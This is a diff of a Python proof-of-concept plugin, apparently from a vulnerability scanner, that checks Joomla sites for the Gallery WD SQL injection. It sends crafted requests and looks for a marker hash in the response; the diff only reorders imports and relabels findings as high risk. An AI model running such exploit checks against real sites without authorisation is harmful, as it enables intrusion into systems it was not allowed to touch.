@@ -1,13 +1,13 @@
-from ..miniCurl import Curl
-from ..t  import T
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+
+from ..miniCurl import Curl
+from ..t  import T
+
 """
 POC Name  : Joomla Gallery WD SQL Injection 
 From : http://cxsecurity.com/issue/WLB-2015030203
 """
-
-
 
 class P(T):
     def __init__(self):
@@ -28,9 +28,9 @@ class P(T):
             code, head, res1, _, _ = curl.curl("%s" % target)
             code, head, res2, _, _ = curl.curl("-d %s %s" % (post, target))
             if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res1:
-                output(target,result,'hole')
+                output(target,result,'高危(HOLE)')
             elif code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res2:
-                output(target,result,'hole')
+                output(target,result,'高危(HOLE)')
     
 
         del curl
